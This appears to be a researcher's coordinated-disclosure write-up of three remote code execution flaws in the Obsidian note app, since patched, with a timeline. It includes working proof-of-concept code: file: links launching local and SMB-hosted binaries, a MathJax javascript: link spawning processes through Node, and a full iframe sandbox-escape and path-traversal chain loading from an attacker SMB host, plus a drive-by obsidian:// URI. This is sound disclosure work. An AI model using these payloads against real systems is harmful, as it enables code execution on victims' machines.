# RCE Vulnerabilities in Obsidian Discovered

- Link: https://obsidian.md/
- Version: v0.13.23 (latest at time of writing)
- Settings: default
- OS: Windows 10

Timeline:
- 03.02.2022 Asking support@obsidian.md about contact for vulnerability disclosure
- 15.02.2022 Asked again, got reply
- 16.02.2022 Vulnerability details privately disclosed
- 16.02.2022 Working on fixes started
- 18.02.2022 Fixed insider version (0.13.25) released https://forum.obsidian.md/t/obsidian-release-v0-13-25-insider-build/32701
- 07.03.2022 Version 0.13.30 containing security fixes released

## Unsafe Link Handling to RCE

URLs of the `file:`-protocol are passed to `shell.openPath` or `shell.openExternal`.
Those are known dangerous functions, where additional validation is necessary in order to prevent undesirable actions like code execution, see:
- https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html
- https://benjamin-altpeter.de/shell-openexternal-dangers/

Affected Obsidian code:

```js
function openExternalUrl(win, url) {
	if (url.startsWith(FILE_PROTO)) {
		url = decodeURIComponent(url.substr(FILE_PROTO.length));
		url = path.normalize(url);
		console.log('Opening file: ' + url);
		openPath(url);
		return;
	}

	let exec = () => {
		console.log('Opening URL: ' + url);
		shell.openExternal(url);
	}

	let schemeMatch = url.match(/^([a-z][a-z0-9+\-.]*):/i);
	let scheme = schemeMatch ? schemeMatch[1].toLowerCase() : '';
	if (scheme === 'http' || scheme === 'https' || scheme === 'obsidian' || (settings.openSchemes && settings.openSchemes[scheme])) {
		return exec();
	}
	[...]
```

```js
function openPath(filepath) {
	if (!isWin && !isMac) {
		shell.openExternal(pathToFileURL(filepath).href);
	}
	else if (shell.openPath) {
		shell.openPath(filepath);
	}
	else {
		// Deprecation since Electron 9.
		shell.openItem(filepath);
	}
}
```

This allows the execution of local files and remote binaries hosted on a SMB server when a malicious link is clicked.
Especially on Windows this is very dangerous.


Example for a Windows machine:

```md
[local binary](file:///c:/windows/system32/calc.exe)

[external binary](file:///\\\\live.sysinternals.com\\tools\\Procmon.exe)
```



## URL Sanitization Bypass with MathJax to RCE

Obsidian supports MathJax syntax.
MathJax contains a function `\href{url}{math}` to create links (see: http://docs.mathjax.org/en/latest/input/tex/extensions/html.html).
In contrast to other possibilities in Obsidian which allow the creation of links, URLs created through this method are *not sanitized*.
This allows the creation of URLs with the `javascript:`-protocol.
Since those links are rendered in the main window context of Obsidian access to all exposed features and functions is possible.

The main window of the desktop application has the following settings:
```
allowRunningInsecureContent: false
backgroundColor: "#00000000"
contextIsolation: false
disableHtmlFullscreenWindowResize: false
enablePreferredSizeMode: false
enableRemoteModule: true
enableWebSQL: true
experimentalFeatures: false
images: true
javascript: true
nativeWindowOpen: false
nodeIntegration: true
nodeIntegrationInSubFrames: false
nodeIntegrationInWorker: false
offscreen: false
plugins: false
sandbox: false
spellcheck: true
textAreasAreResizable: true
webSecurity: true
webgl: true
webviewTag: false
worldSafeExecuteJavaScript: true
```

As we can see `nodeIntegration` is enabled.
Furthermore several Node API modules are exposed via preload script.
This means we have direct access to many dangerous functions and can easily achieve code execution when someone clicks a link.

For example by adding the following MathJax created link in the notes, the calculator application on Windows will be spawned via Node.js calls:
```js
$$\href{javascript:module.__proto__.require("child_process").spawnSync("calc.exe")}{JS-Url-Not-Sanitized}$$
```


## IFrame Sandbox Bypass and Path Traversal to RCE

Obsidian allows the inclusion of external content like videos through HTML `iframe` elements.
In order to safeguard against potential attacks, in general HTML Elements within Obsidians Markdown files are sanitized with the `DOMPurify` library.
From the minified source code we can observe that a custom `afterSanitizeAttributes` hook is used, as well as the `DOMPurify` settings as variable `Kg`:

```js
DOMPurify.addHook("afterSanitizeAttributes", (function(t) {
    if (t instanceof HTMLAnchorElement && (t.setAttribute("target", "_blank"),
    t.setAttribute("rel", "noopener")),
    t instanceof HTMLIFrameElement && (t.setAttribute("sandbox", "allow-forms allow-presentation allow-same-origin allow-scripts allow-modals"),
    t.hasAttribute("allow"))) {
        for (var e = [], n = 0, i = t.getAttribute("allow").split(";"); n < i.length; n++) {
            var r = i[n];
            r = r.trim().toLowerCase(),
            Gg.hasOwnProperty(r) && Gg[r] && e.push(r)
        }
        t.setAttribute("allow", e.join("; "))
    }
}
));
var Kg = {
    ALLOW_UNKNOWN_PROTOCOLS: !0,
    RETURN_DOM_FRAGMENT: !0,
    RETURN_DOM_IMPORT: !0,
    FORBID_TAGS: ["style"],
    ADD_TAGS: ["iframe"],
    ADD_ATTR: ["frameborder", "allowfullscreen", "allow", "aria-label-position"]
};
function $g(t) {
    return DOMPurify.sanitize(t, Kg)
}
```

We can see that `iframe` elements are explicitly allowed and for each of them, the `sandbox` attribute is set to `allow-forms allow-presentation allow-same-origin allow-scripts allow-modals`.
The combination of `allow-same-origin` and `allow-scripts` is dangerous and will allow us to escape the sandbox later.
In the [HTML spec](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox) one can find the following warning:
> Setting both the allow-scripts and allow-same-origin keywords together when the embedded page has the same origin as the page containing the iframe allows the embedded page to simply remove the sandbox attribute and then reload itself, effectively breaking out of the sandbox altogether.

Furthermore, Obsidian registers a ["file"-protocol](https://www.electronjs.org/de/docs/latest/api/protocol#protocolregisterfileprotocolscheme-handler) which allows handling a custom URL scheme in a similar way like the standard `file:`-protocol:

```js
protocol.registerFileProtocol('app', (req, callback) => {
	let url = req.url;
	// Strip query and hash components
	if (url.indexOf('?') > 0) {
		url = url.substr(0, url.indexOf('?'));
	}
	if (url.indexOf('#') > 0) {
		url = url.substr(0, url.indexOf('#'));
	}
	if (url.indexOf(URL_ROOT) === 0) {
		url = decodeURIComponent(url.substr(URL_ROOT.length));
		url = path.join(RES_PATH, url);
	}
	else if (url.indexOf(FILE_ROOT) === 0) {
		url = decodeURIComponent(url.substr(FILE_ROOT.length));
		if (!isWin) {
			url = '/' + url;
		}
		url = path.resolve(url);
	}
	callback({path: url});
});
```

To be precise, there are two different types of this handler.
URLs that start with `app://local/` and those that start with `app://obsidian.md/`.

```js
let SCHEME = 'app';
let PROTOCOL = SCHEME + '://';
let URL_ROOT = PROTOCOL + 'obsidian.md/';
let FILE_ROOT = PROTOCOL + 'local/';
```

In both cases, the URL is decoded with `decodeURIComponent` and then the prefix is stripped.
Afterwards they are handled slightly different as can be seen above in the `registerFileProtocol` handler.

When a URL starts with `app://local/` (type `FILE_ROOT`) the Node.js filesystem function `path.resolve` is called to build the final URL.  
If the URL starts with `app://obsidian.md/` (type `URL_ROOT`), the final URL is resolved differently:
With `path.join(RES_PATH, url)` the `RES_PATH` is joined together with the received URL and then normalized.
`RES_PATH` points to the applications [asar](https://github.com/electron/asar) package located in the installation directory.
In my test (on a Windows machine) this was `C:\Users\testuser\AppData\Roaming\obsidian\obsidian-0.13.23.asar`.

Some of the differences in behavior of `path.resolve` versus `path.join` can be viewed in the test cases of the Node.js source code repository:
- https://github.com/nodejs/node/blob/master/test/parallel/test-path-join.js
- https://github.com/nodejs/node/blob/master/test/parallel/test-path-resolve.js

For our case the ability to escape the local filesystem with `app://local/` URLs (and specifically `path.resolve`) is interesting.
Furthermore it is interesting, that the application puts the main application window in the `app://obsidian.md` origin.

The exploit chain for code execution looks as follows:  
A URL of the form `app://local/%5C%5Cour-smb-server.tld%5Cfolder%5Cexploit.html` will allow us to load files from an external SMB server or network share inside an iframe.  
In the previously loaded `exploit.html` from the server we create another iframe in order to read the local `obsidian.json` file containing all the vault mappings of Obsidian.
Since both our frames are in the `app://local/` origin we have access.  
With the knowledge of the local vaults we can now create a URL starting with `app://obsidian.md/` to load a secondary *local file* `payload.html` in our initial `iframe`, changing its origin.
This will put `payload.html` in the same origin as the main window of the Obsidian application.
Now we can escape the sandbox of the `iframe` and have access to the Node.js APIs which allow arbitrary code execution.


### Example proof of concept:

Three files need to be created and placed as instructed.
- `exploit.md`: Malicious markdown file opened in Obsidian.
- `exploit.html`: "Loader" file hosted on a remote server.
- `payload.html`: Actual payload that will be executed.

`exploit.md` local note file in a vault (that was copied from some untrusted origin for example):
```html
<iframe src="app://local/%5C%5Cour-smb-server.tld%5Cfolder%5Cexploit.html"></iframe>
```
The host `our-smb-server.tld` and path to the file need to be adapted to the actual location of the next file (`exploit.html`).
Note: At least one path segment (share name) in the URL is important here or the path resolution won't be correct.
This file just contains the initial `iframe`-element that triggers the exploit execution.
It abuses the vulnerability described above to escape the local file system path with `app://local/`-URLs.

`exploit.html` hosted on an SMB server (or network share):

```html
<html>
<head>
</head>
<body>
<script>
var ifr = document.createElement("iframe");
//ifr.src = "app://local/..%5C%5C..%5C%5C..%5C%5CRoaming%5C%5Cobsidian%5C%5Cobsidian.json"; // debug
ifr.src = "app://local/..%5C%5C..%5C%5CRoaming%5C%5Cobsidian%5C%5Cobsidian.json";
ifr.onload = () => {
	var vaultMappings = JSON.parse(ifr.contentDocument.body.innerText);
	console.log(vaultMappings);
	for (let i in vaultMappings.vaults) {
		if (vaultMappings.vaults[i].open) {
			let url = "app://obsidian.md/..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C.."+ vaultMappings.vaults[i].path.substr(2) +"\\payload.html";
			console.log("found: "+ url);
			window.location = url;
			break;
		}
	}
};
document.body.appendChild(ifr);
</script>
</body>
</html>
```

This file gets loaded inside the first iframe, which then loads `obsidian.json` in a sub-iframe.
`obsidian.json` is used internally by the Obsidian app and contains the mappings of file system paths to different vaults.
Both iframes reside in the same origin (`app://local`), allowing read access.
We get the path to the currently opened vault where our initial iframe and the payload file (`payload.html`) resides.
Knowing the storage locations, we can now load the payload file in the `app://obsidian.md`-origin with some path traversal and the actual file system path.
Since our payload iframe now has the same origin as the main window we can escape the sandbox and get arbitrary code execution.

`payload.html` delivered within the malicious vault (alongside `exploit.md`):

```html
<html>
<head>
<script>
window.parent.module.__proto__.require("child_process").spawnSync("calc.exe")
</script>
</head>
<body>
payload
</body>
</html>
```

The victim just needs to trigger a rendering of the `iframe` either automatically or by accessing reading mode of the `exploit.md` file.

Alternatively this could be triggered by a malicious link on any website!
Obsidian registers the `obsidian://`-protocol [handler](https://help.obsidian.md/Advanced+topics/Using+obsidian+URI), meaning any link starting with `obsidian://` will be opened in the application.
Through this mechanism we could create a new file with the content of the initial `exploit.md` above in the "Obsidian Help" vault which exists by default.
Example: `obsidian://new?&vault=Obsidian%20Help&file=x&content=%3Ciframe%20src%3D%22app%3A%2F%2Flocal%2F%255C%255Cour-smb-server.tld%255Cfolder%255Cexploit.html%22%3E%3C%2Fiframe%3E`

So this vulnerability is especially dangerous because it could be triggered in a drive-by style and not even requiring intentionally downloading and opening an untrusted vault.

![PoC - IFrame Sandbox Bypass and Path Traversal to RCE](obsidian-rce.mp4)


## Conclusion

The last vulnerability ("IFrame Sandbox Bypass and Path Traversal to RCE") was actually very interesting to exploit as it combined several different weaknesses to achieve code execution.

After the initial delay the Obsidian developers were very responsive and communication was very good. 
They quickly started working on the fixes and soon afterwards delivered an updated version.


---

Changelog:
- 12.02.2022 Initial writeup
- 26.03.2022 Minor updates
- 14.07.2022 Published post after 3 months time for updates as coordinated